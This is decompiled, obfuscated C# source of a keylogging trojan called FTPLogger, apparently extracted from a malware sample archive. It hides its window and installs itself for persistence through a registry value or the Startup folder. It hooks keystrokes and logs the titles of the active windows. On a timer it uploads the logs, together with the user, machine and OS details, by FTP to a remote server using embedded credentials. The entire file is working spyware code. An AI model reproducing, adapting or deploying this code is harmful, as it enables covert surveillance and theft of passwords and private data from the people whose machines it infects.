// Decompiled with JetBrains decompiler
// Type: FTPLogger.Form1
// Assembly: FTPLogger, Version=1.5.3.0, Culture=neutral, PublicKeyToken=null
// MVID: FD4E7A7F-A947-48A6-8854-D02BB59892CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\Trojan-Ransom.Win32.Blocker.jfhu-27d1827589859d42172be9d94e6a9e09d79adabcba942daefda1415d2ce69b43.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace FTPLogger
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer \u0002;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer \u0003;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer \u0005;
    [AccessedThroughProperty("TextBox1")]
    private TextBox \u0008;
    [AccessedThroughProperty("RichTextBox1")]
    private RichTextBox \u0006;
    private string \u000E;
    private string \u000F;
    [AccessedThroughProperty("kHook")]
    private \u0008 \u0002\u2000;
    private int \u0003\u2000;

    public Form1()
    {
      this.Load += new EventHandler(this.\u0002);
      this.FormClosing += new FormClosingEventHandler(this.\u0002);
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(new \u0008());
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0002 == null)
          return;
        this.\u0002.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0002()
    {
      this.\u0002 = (IContainer) new System.ComponentModel.Container();
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(new System.Windows.Forms.Timer(this.\u0002));
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0003(new System.Windows.Forms.Timer(this.\u0002));
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(new TextBox());
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(new RichTextBox());
      this.SuspendLayout();
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Enabled = true;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Interval = 1200000;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0003().Enabled = true;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0003().Interval = 300;
      TextBox textBox1 = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002();
      Point point1 = new Point(2, 3);
      Point point2 = point1;
      textBox1.Location = point2;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Name = \u000F.\u0002(-2014548733);
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().ReadOnly = true;
      TextBox textBox2 = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002();
      Size size1 = new Size(194, 20);
      Size size2 = size1;
      textBox2.Size = size2;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().TabIndex = 0;
      RichTextBox richTextBox1 = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002();
      point1 = new Point(2, 24);
      Point point3 = point1;
      richTextBox1.Location = point3;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Name = \u000F.\u0002(-2014548496);
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().ReadOnly = true;
      RichTextBox richTextBox2 = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002();
      size1 = new Size(195, 71);
      Size size3 = size1;
      richTextBox2.Size = size3;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().TabIndex = 1;
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text = string.Empty;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.White;
      size1 = new Size(199, 108);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002());
      this.Controls.Add((Control) this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002());
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = \u000F.\u0002(-2014548507);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [DebuggerNonUserCode]
    internal virtual System.Windows.Forms.Timer FTPLogger\u002EForm1\u2005\u2006\u2003\u0002() => this.\u0003;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0003);
      if (this.\u0003 != null)
        this.\u0003.Tick -= eventHandler;
      this.\u0003 = _param1;
      if (this.\u0003 == null)
        return;
      this.\u0003.Tick += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual System.Windows.Forms.Timer FTPLogger\u002EForm1\u2005\u2006\u2003\u0003() => this.\u0005;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void FTPLogger\u002EForm1\u2005\u2006\u2003\u0003(System.Windows.Forms.Timer _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0005);
      if (this.\u0005 != null)
        this.\u0005.Tick -= eventHandler;
      this.\u0005 = _param1;
      if (this.\u0005 == null)
        return;
      this.\u0005.Tick += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual TextBox FTPLogger\u002EForm1\u2005\u2006\u2003\u0002() => this.\u0008;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(TextBox _param1)
    {
      EventHandler eventHandler = new EventHandler(this.\u0008);
      if (this.\u0008 != null)
        this.\u0008.TextChanged -= eventHandler;
      this.\u0008 = _param1;
      if (this.\u0008 == null)
        return;
      this.\u0008.TextChanged += eventHandler;
    }

    [DebuggerNonUserCode]
    internal virtual RichTextBox FTPLogger\u002EForm1\u2005\u2006\u2003\u0002() => this.\u0006;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(RichTextBox _param1) => this.\u0006 = _param1;

    [DebuggerNonUserCode]
    private virtual \u0008 FTPLogger\u002EForm1\u2005\u2006\u2003\u0002() => this.\u0002\u2000;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.Synchronized)]
    private virtual void FTPLogger\u002EForm1\u2005\u2006\u2003\u0002(\u0008 _param1)
    {
      \u0008.\u0005 obj = new \u0008.\u0005(this.\u0002);
      if (this.\u0002\u2000 != null)
        \u0008.\u0003(obj);
      this.\u0002\u2000 = _param1;
      if (this.\u0002\u2000 == null)
        return;
      \u0008.\u0002(obj);
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long GetActiveWindow();

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long \u0002(long _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, long _param2);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr _param0, ref int _param1);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(IntPtr _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(long _param0);

    private void \u0002(object _param1, FormClosingEventArgs _param2) => this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().\u0003();

    private void \u0002(object _param1, EventArgs _param2)
    {
      this.Visible = false;
      string location = Assembly.GetExecutingAssembly().Location;
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(\u000F.\u0002(-2014548527), true);
        registryKey.SetValue(\u000F.\u0002(-2014548571), (object) (folderPath + \u000F.\u0002(-2014548584)));
        registryKey.Close();
        System.IO.File.Copy(location, folderPath + \u000F.\u0002(-2014548584));
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        try
        {
          string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
          System.IO.File.Copy(location, folderPath + \u000F.\u0002(-2014548584));
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
      }
      this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().\u0002();
    }

    private void \u0002(Keys _param1) => this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text += this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().\u0002(_param1);

    private void \u0003(object _param1, EventArgs _param2)
    {
      try
      {
        VBMath.Randomize();
        string str1 = Conversions.ToString(new Random().Next(1, 100000));
        string environmentVariable = Environment.GetEnvironmentVariable(\u000F.\u0002(-2014548595));
        this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text = \u000F.\u0002(-2014548874) + SystemInformation.UserName + \u000F.\u0002(-2014548887) + Environment.MachineName + \u000F.\u0002(-2014548902) + \u0005.\u0002().Info.InstalledUICulture.ToString() + \u000F.\u0002(-2014548939) + \u0005.\u0002().Info.OSFullName + \u000F.\u0002(-2014548946) + this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text;
        this.\u000F = environmentVariable + \u000F.\u0002(-2014548979) + str1 + \u000F.\u0002(-2014548747);
        this.\u000E = str1 + \u000F.\u0002(-2014548747);
        if (System.IO.File.Exists(this.\u000F))
          System.IO.File.Delete(this.\u000F);
        StreamWriter streamWriter = new StreamWriter(this.\u000F);
        string[] lines = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Lines;
        int index = 0;
        while (index < lines.Length)
        {
          string str2 = lines[index];
          streamWriter.WriteLine(str2);
          checked { ++index; }
        }
        streamWriter.Close();
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u000F.\u0002(-2014548738) + this.\u000E);
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(\u000F.\u0002(-2014548776), \u000F.\u0002(-2014548787));
        ftpWebRequest.Method = \u000F.\u0002(-2014548827);
        byte[] buffer = System.IO.File.ReadAllBytes(this.\u000F);
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
        System.IO.File.Delete(this.\u000F);
        this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Clear();
        Thread.Sleep(1000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0005(object _param1, EventArgs _param2)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        IntPtr foregroundWindow = Form1.GetForegroundWindow();
label_2:
        num3 = 3;
        if (foregroundWindow == IntPtr.Zero)
          goto label_24;
label_3:
        num3 = 6;
        int num4 = Form1.\u0002((long) foregroundWindow);
label_4:
        num3 = 7;
        string str = Strings.StrDup(checked (num4 + 1), \u000F.\u0002(-2014548818));
label_5:
        num3 = 8;
        Form1.\u0002(foregroundWindow, ref str, checked (num4 + 1));
label_6:
        num3 = 9;
        int processId = 0;
label_7:
        num3 = 10;
        Form1.GetWindowThreadProcessId(foregroundWindow, ref processId);
label_8:
        num3 = 11;
        if (processId == 0)
          goto label_24;
label_9:
        num3 = 14;
        Process processById = Process.GetProcessById(processId);
label_10:
        num3 = 15;
        if (processById == null)
          goto label_24;
label_11:
        num3 = 18;
        processId.ToString();
label_12:
        num3 = 19;
        string processName = processById.ProcessName;
label_13:
        num3 = 20;
        string mainWindowTitle = processById.MainWindowTitle;
label_14:
        num3 = 21;
label_15:
        num3 = 22;
        num4.ToString();
label_16:
        num3 = 23;
        if (Operators.CompareString(mainWindowTitle, string.Empty, false) == 0)
          goto label_24;
label_17:
        num3 = 24;
        this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text = \u000F.\u0002(-2014548842) + mainWindowTitle + \u000F.\u0002(-2014548854);
        goto label_24;
label_19:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
              case 12:
              case 16:
              case 25:
              case 26:
                goto label_24;
              case 5:
              case 6:
                goto label_3;
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 9:
                goto label_6;
              case 10:
                goto label_7;
              case 11:
                goto label_8;
              case 13:
              case 14:
                goto label_9;
              case 15:
                goto label_10;
              case 17:
              case 18:
                goto label_11;
              case 19:
                goto label_12;
              case 20:
                goto label_13;
              case 21:
                goto label_14;
              case 22:
                goto label_15;
              case 23:
                goto label_16;
              case 24:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_19;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_24:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void \u0008(object _param1, EventArgs _param2)
    {
      RichTextBox richTextBox = this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002();
      richTextBox.Text = richTextBox.Text + \u000F.\u0002(-2014548108) + this.FTPLogger\u002EForm1\u2005\u2006\u2003\u0002().Text + \u000F.\u0002(-2014548127);
    }
  }
}
